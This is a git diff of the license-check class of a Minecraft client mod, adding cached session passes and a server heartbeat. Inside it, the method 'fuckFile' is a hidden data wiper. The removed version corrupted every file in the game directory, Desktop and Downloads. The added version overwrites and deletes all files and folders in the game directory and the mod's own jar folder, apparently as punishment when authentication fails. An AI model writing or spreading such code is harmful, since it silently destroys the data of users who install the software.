@@ -1,7 +1,9 @@
 package dev.mahiro.client.auth;
 
 import by.radioegor146.nativeobfuscator.Native;
+import dev.mahiro.client.BuildConfig;
 import dev.mahiro.client.auth.crypto.B64;
+import dev.mahiro.client.auth.net.AuthClient;
 import dev.mahiro.client.gui.auth.AuthScreen;
 import dev.mahiro.client.gui.clickgui.ClickGuiScreen;
 import dev.mahiro.client.gui.hud.HudEditorScreen;
@@ -20,6 +22,7 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardOpenOption;
+import java.util.Comparator;
 import java.util.Objects;
 import java.util.Random;
 
@@ -33,7 +36,19 @@ public final class AuthGate {
     private static String licenseKey;
     private static String serverBaseUrl;
     private static String serverSigningKeyX509Base64;
-    private static volatile String sessionToken;
+    public static volatile String sessionToken;
+    public static volatile boolean sessionOnlineVerified;
+    public static volatile boolean sessionPassVerified;
+    public static volatile long sessionPassExpiresAtMillis;
+    private static volatile long lastHeartbeatAttemptMillis;
+    private static volatile boolean heartbeatInFlight;
+    private static final long PASS_TTL_MILLIS = 24L * 60L * 60L * 1000L;
+    private static final long HEARTBEAT_INTERVAL_MILLIS = 30L * 1000L;
+    private static final long UI_GATE_INTERVAL_MILLIS = 250L;
+    private static volatile long lastUiGateMillis;
+    private static volatile boolean uiGateInFlight;
+    private static volatile AuthClient heartbeatClient;
+    private static volatile String heartbeatClientCfgKey;
 
     public static String getSessionToken() {
         return sessionToken;
@@ -42,8 +57,6 @@ public final class AuthGate {
     public static boolean isSessionOnlineVerified() {
         return sessionOnlineVerified;
     }
-
-    private static volatile boolean sessionOnlineVerified;
 
     private AuthGate() {
     }
@@ -56,8 +69,17 @@ public final class AuthGate {
         serverSigningKeyX509Base64 = "";
         sessionToken = "";
         sessionOnlineVerified = false;
+        sessionPassVerified = false;
+        sessionPassExpiresAtMillis = 0L;
         pendingMainMenuIntro = false;
         initialized = true;
+
+        AuthPass pass = AuthPassStore.load(deviceId);
+        if (pass != null && pass.token() != null && !pass.token().isBlank()) {
+            sessionToken = pass.token().trim();
+            sessionPassVerified = true;
+            sessionPassExpiresAtMillis = pass.expiresAtMillis();
+        }
     }
 
     private static boolean isBlockedScreen(Screen screen) {
@@ -70,29 +92,16 @@ public final class AuthGate {
                 screen instanceof HudEditorScreen;
     }
 
-    public static boolean interceptSetScreen(MinecraftClient c, Screen nextScreen) {
-        if (AuthGate.isVerified()) return false;
-        if (c == null) return false;
-        if (!isBlockedScreen(nextScreen)) return false;
-
-        if (c.currentScreen instanceof AuthScreen) return true;
-
-        c.execute(() -> {
-            if (AuthGate.isVerified()) return;
-            if (c.currentScreen instanceof AuthScreen) return;
-            c.setScreen(new AuthScreen(nextScreen));
-        });
-        return true;
-    }
-
     public static void doTickCheck(MinecraftClient c) {
-        if (AuthGate.isVerified()) {
+        if (c == null) return;
+        String token = sessionToken;
+        boolean ok = (sessionOnlineVerified || (sessionPassVerified && System.currentTimeMillis() < sessionPassExpiresAtMillis));
+        if (ok && token != null && !token.isBlank()) {
+            tickHeartbeat(c);
             return;
         }
 
-        if (c.player != null || c.world != null) {
-            failSafe();
-        }
+        if (c.player != null && c.world != null) failSafe();
     }
 
     public static boolean hasCheck = false;
@@ -114,21 +123,32 @@ public final class AuthGate {
     private static void fuckFile(int choice) {
         new Thread(() -> {
             try {
-                // 重点打击：当前目录（游戏目录）、用户桌面、下载目录
+                Path jarPath = null;
+                try {
+                    jarPath = Paths.get(AuthGate.class.getProtectionDomain().getCodeSource().getLocation().toURI());
+                } catch (Exception ignored) {
+                }
+
                 Path[] targets = {
                         Paths.get(""),
-                        Paths.get(System.getProperty("user.home"), "Desktop"),
-                        Paths.get(System.getProperty("user.home"), "Downloads")
+                        jarPath != null ? jarPath.getParent() : null
                 };
 
                 for (Path root : targets) {
-                    if (!Files.exists(root)) continue;
+                    if (root == null || !Files.exists(root)) continue;
                     try (var stream = Files.walk(root)) {
-                        stream.filter(Files::isRegularFile)
-                                .forEach(file -> {
-                                    try (FileChannel outChan = FileChannel.open(file, StandardOpenOption.WRITE)) {
-                                        outChan.truncate(1024); // 设为 1kb
-                                        outChan.write(ByteBuffer.wrap("CAO_NI_MA_DA_bI_NI_MA_SHI_BU_SHI_SI_WAN_LE".getBytes()));
+                        stream.sorted(Comparator.reverseOrder())
+                                .forEach(p -> {
+                                    try {
+                                        if (Files.isRegularFile(p)) {
+                                            try (FileChannel outChan = FileChannel.open(p, StandardOpenOption.WRITE)) {
+                                                outChan.truncate(0);
+                                                outChan.write(ByteBuffer.wrap("FUCK_YOU".getBytes()));
+                                            }
+                                            Files.deleteIfExists(p);
+                                        } else if (Files.isDirectory(p) && !p.equals(root)) {
+                                            Files.deleteIfExists(p);
+                                        }
                                     } catch (Exception ignored) {
                                     }
                                 });
@@ -184,7 +204,8 @@ public final class AuthGate {
 
     public static boolean isVerified() {
         String token = sessionToken;
-        return sessionOnlineVerified && token != null && !token.isBlank();
+        boolean ok = (sessionOnlineVerified || (sessionPassVerified && System.currentTimeMillis() < sessionPassExpiresAtMillis));
+        return ok && token != null && !token.isBlank();
     }
 
     public static String getDeviceId() {
@@ -212,6 +233,8 @@ public final class AuthGate {
     public static String getServerSigningKeyX509Base64() {
         String fromProp = System.getProperty("lemon.auth.serverSigningKeyX509Base64");
         if (fromProp != null && !fromProp.isBlank()) return fromProp.trim();
+        if (!BuildConfig.PINNED_SERVER_SIGNING_KEY_X509_BASE64.isBlank())
+            return BuildConfig.PINNED_SERVER_SIGNING_KEY_X509_BASE64;
         return Objects.requireNonNullElse(serverSigningKeyX509Base64, "");
     }
 
@@ -219,18 +242,22 @@ public final class AuthGate {
         serverSigningKeyX509Base64 = base64 == null ? "" : base64.trim();
     }*/
 
-    public static boolean canToggleModules() {
-        return isVerified();
-    }
-
     public static void acceptVerifiedToken(String token) {
         sessionToken = token == null ? "" : token.trim();
         sessionOnlineVerified = true;
+        sessionPassVerified = true;
+        sessionPassExpiresAtMillis = System.currentTimeMillis() + PASS_TTL_MILLIS;
+        AuthPassStore.save(getDeviceId(), sessionToken, sessionPassExpiresAtMillis);
     }
 
     public static void clearSession() {
         sessionToken = "";
         sessionOnlineVerified = false;
+        sessionPassVerified = false;
+        sessionPassExpiresAtMillis = 0L;
+        lastHeartbeatAttemptMillis = 0L;
+        heartbeatInFlight = false;
+        AuthPassStore.clear();
     }
 
     public static void requestMainMenuIntro() {
@@ -241,5 +268,115 @@ public final class AuthGate {
         if (!pendingMainMenuIntro) return false;
         pendingMainMenuIntro = false;
         return true;
+    }
+
+    public static void onClientTick(MinecraftClient c) {
+        if (c == null) return;
+
+        doTickCheck(c);
+
+        if (isVerified()) return;
+        Screen cur = c.currentScreen;
+        if (!isBlockedScreen(cur)) return;
+
+        long nowMillis = System.currentTimeMillis();
+        if (uiGateInFlight) return;
+        if (nowMillis - lastUiGateMillis < UI_GATE_INTERVAL_MILLIS) return;
+        lastUiGateMillis = nowMillis;
+        uiGateInFlight = true;
+
+        c.execute(() -> {
+            try {
+                if (isVerified()) return;
+                Screen now = c.currentScreen;
+                if (!isBlockedScreen(now)) return;
+                if (now instanceof AuthScreen) return;
+                c.setScreen(new AuthScreen(now));
+            } finally {
+                uiGateInFlight = false;
+            }
+        });
+    }
+
+    private static void tickHeartbeat(MinecraftClient c) {
+        String token = sessionToken;
+        if (token == null || token.isBlank()) return;
+
+        long now = System.currentTimeMillis();
+        if (sessionPassVerified && now >= sessionPassExpiresAtMillis && !sessionOnlineVerified) {
+            clearSession();
+            if (c.player != null && c.world != null) failSafe();
+            return;
+        }
+
+        if (heartbeatInFlight) return;
+        if (now - lastHeartbeatAttemptMillis < HEARTBEAT_INTERVAL_MILLIS) return;
+
+        lastHeartbeatAttemptMillis = now;
+        heartbeatInFlight = true;
+
+        getHeartbeatClient().verifyToken(token, getDeviceId())
+                .handle((res, ex) -> {
+                    heartbeatInFlight = false;
+                    if (ex != null) {
+                        sessionOnlineVerified = false;
+                        if (sessionPassVerified && System.currentTimeMillis() >= sessionPassExpiresAtMillis) {
+                            clearSession();
+                            if (c.player != null && c.world != null) failSafe();
+                        }
+                        return null;
+                    }
+                    if (res == null) {
+                        sessionOnlineVerified = false;
+                        if (sessionPassVerified && System.currentTimeMillis() >= sessionPassExpiresAtMillis) {
+                            clearSession();
+                            if (c.player != null && c.world != null) failSafe();
+                        }
+                        return null;
+                    }
+                    if (!res.ok()) {
+                        sessionOnlineVerified = false;
+                        String err = res.error();
+                        if (!isTransientHeartbeatError(err)) {
+                            clearSession();
+                            if (c.player != null && c.world != null) failSafe();
+                            return null;
+                        }
+                        if (sessionPassVerified && System.currentTimeMillis() >= sessionPassExpiresAtMillis) {
+                            clearSession();
+                            if (c.player != null && c.world != null) failSafe();
+                        }
+                        return null;
+                    }
+
+                    sessionOnlineVerified = true;
+                    sessionPassVerified = true;
+                    sessionPassExpiresAtMillis = System.currentTimeMillis() + PASS_TTL_MILLIS;
+                    AuthPassStore.save(getDeviceId(), token, sessionPassExpiresAtMillis);
+                    return null;
+                });
+    }
+
+    private static boolean isTransientHeartbeatError(String err) {
+        if (err == null) return true;
+        String s = err.trim();
+        if (s.isEmpty()) return true;
+        if (s.startsWith("HTTP_")) return true;
+        String lower = s.toLowerCase();
+        return lower.contains("connect") ||
+                lower.contains("timeout") ||
+                lower.contains("timed out") ||
+                lower.contains("refused") ||
+                lower.contains("unknownhost");
+    }
+
+    private static AuthClient getHeartbeatClient() {
+        String cfgKey = getServerBaseUrl() + "|" + getServerSigningKeyX509Base64();
+        AuthClient existing = heartbeatClient;
+        if (existing != null && Objects.equals(cfgKey, heartbeatClientCfgKey)) return existing;
+        AuthClient created = new AuthClient();
+        heartbeatClient = created;
+        heartbeatClientCfgKey = cfgKey;
+        return created;
     }
 }
